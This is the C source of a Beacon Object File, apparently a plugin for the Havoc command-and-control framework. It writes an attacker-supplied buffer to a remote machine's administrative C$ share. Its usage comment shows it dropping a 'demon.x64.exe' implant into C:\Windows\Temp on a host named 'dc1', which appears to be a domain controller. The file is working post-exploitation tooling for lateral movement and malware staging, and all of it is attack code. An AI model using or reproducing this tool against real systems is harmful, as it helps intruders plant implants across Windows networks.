// x86_64-w64-mingw32-gcc -c writefileBOF.c -w -o /share/writeFileBOF.x64.o
// DiskLoader writefile dc1 /root/demon.x64.exe C:\Windows\Temp\ok.exe
#include <windows.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(
  HANDLE       hFile,
  LPCVOID      lpBuffer,
  DWORD        nNumberOfBytesToWrite,
  LPDWORD      lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(
  HANDLE hObject
);

DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(
  DWORD dwMilliseconds
);

WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI int __cdecl MSVCRT$strlen(const char *str);

void go(char * args, int length) {

  datap  parser;
  char * targetHost;
  char * remotePath;
  size_t    dwBytesToWrite;

  BeaconDataParse(&parser, args, length);
  targetHost = BeaconDataExtract(&parser, NULL);
  remotePath = BeaconDataExtract(&parser, NULL);
  dwBytesToWrite = BeaconDataInt(&parser);
  unsigned char * DataBuffer = BeaconDataExtract(&parser, NULL);

  /* debug arguments passed from havoc module
  BeaconPrintf(CALLBACK_OUTPUT, "targetHost: %s", targetHost);
  BeaconPrintf(CALLBACK_OUTPUT, "remotePath: %s", remotePath);
  BeaconPrintf(CALLBACK_OUTPUT, "dwBytesToWrite: %d", dwBytesToWrite);
  */

  HANDLE hFile;
  char filePath[500];
  MSVCRT$sprintf(filePath, "\\\\%s\\C$%s", targetHost, remotePath);
  DWORD dwBytesWritten = 0;
  BOOL bErrorFlag = FALSE;

  hFile = KERNEL32$CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  if (hFile == INVALID_HANDLE_VALUE) 
  { 
      BeaconPrintf(CALLBACK_OUTPUT, "Terminal failure: Unable to open file \"%s\" for write.\n", filePath);
      return;
  }

  bErrorFlag = KERNEL32$WriteFile(hFile, DataBuffer, dwBytesToWrite, &dwBytesWritten, NULL);

  if (FALSE == bErrorFlag)
  {
      BeaconPrintf(CALLBACK_OUTPUT, "Terminal failure: Unable to write to file.\n");
  }
  else
  {
      if (dwBytesWritten != dwBytesToWrite)
      {
          BeaconPrintf(CALLBACK_OUTPUT, "Error: dwBytesWritten != dwBytesToWrite\n");
      }
      else
      {
          BeaconPrintf(CALLBACK_OUTPUT, "Wrote %d bytes to %s successfully.\n", dwBytesWritten, filePath);
      }
  }

  KERNEL32$CloseHandle(hFile);
  return 0;
}